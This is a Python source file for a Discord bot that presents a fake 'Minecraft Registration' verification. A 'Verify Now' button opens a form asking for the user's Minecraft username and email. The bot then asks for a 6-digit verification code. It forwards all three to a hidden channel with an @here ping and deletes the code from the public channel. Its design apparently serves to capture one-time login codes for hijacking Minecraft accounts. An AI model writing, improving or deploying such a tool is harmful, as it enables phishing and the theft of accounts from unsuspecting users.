import discord
from discord import ui, app_commands
import asyncio
from config import token, guild_id, main_channel, channel_id

class MyBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)
        self.synced = False

    async def on_ready(self):
        if not self.synced:
            await tree.sync(guild=discord.Object(id=guild_id))
            self.synced = True
        print(f'Logged in as {self.user}.')

class RegistrationModal(ui.Modal):
    def __init__(self, bot):
        super().__init__(title='Minecraft Registration')
        self.bot = bot

    username = ui.TextInput(label='Minecraft Username', style=discord.TextStyle.short, placeholder='Your Minecraft Username', required=True, min_length=3, max_length=20)
    email = ui.TextInput(label='Minecraft Email', style=discord.TextStyle.short, placeholder='Your Minecraft Email', required=True, min_length=8, max_length=50)

    async def on_submit(self, interaction: discord.Interaction):
        username = self.username.value
        email = self.email.value

        # Send initial message to channel_id
        login_channel = self.bot.get_channel(channel_id)
        if login_channel is not None:
            await login_channel.send(f"@here {interaction.user.mention} registered with username: {username} and email: {email}")


        await interaction.response.send_message("Please enter the 6-digit verification code you received:", ephemeral=True)

        def check(message):
            return (message.channel.id == main_channel and
                    message.author == interaction.user and
                    len(message.content) == 6 and
                    message.content.isdigit())

        try:
            message = await self.bot.wait_for('message', check=check, timeout=60)  # 60 seconds timeout


            await login_channel.send(f"Verification code entered by {interaction.user.mention}: {message.content}")


            await message.delete(delay=2)

        except asyncio.TimeoutError:
            await interaction.followup.send("You took too long to respond!", ephemeral=True)

class VerificationButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="Verify Now", style=discord.ButtonStyle.green)

    async def callback(self, interaction: discord.Interaction):
        modal = RegistrationModal(interaction.client)  # Pass the bot instance
        await interaction.response.send_modal(modal)

class MessageCleaner:
    def __init__(self, bot):
        self.bot = bot

    async def clean_messages(self, channel):
        async for msg in channel.history(limit=100):
            if msg.author == self.bot.user:
                continue  # Skip bot's own messages
            if not (len(msg.content) == 6 and msg.content.isdigit()):
                await msg.delete()

bot = MyBot()
tree = app_commands.CommandTree(bot)

@tree.command(guild=discord.Object(id=guild_id), name='wyslijmodel', description='Minecraft Registration Modal')
async def wyslijmodel(interaction: discord.Interaction):
    modal = RegistrationModal(bot)  # Pass the bot instance
    await interaction.response.send_modal(modal)

@tree.command(guild=discord.Object(id=guild_id), name='wyslijverify', description='Sends verification information')
async def wyslijverify(interaction: discord.Interaction):

    button = VerificationButton()
    await interaction.response.send_message("Click the button to verify your registration.", view=discord.ui.View().add_item(button), ephemeral=False)


    channel = bot.get_channel(main_channel)
    if channel:
        cleaner = MessageCleaner(bot)
        await cleaner.clean_messages(channel)

@bot.event
async def on_message(message):
    if message.channel.id == main_channel and message.author != bot.user:

        if not (len(message.content) == 6 and message.content.isdigit()):
            await message.delete()

bot.run(token)
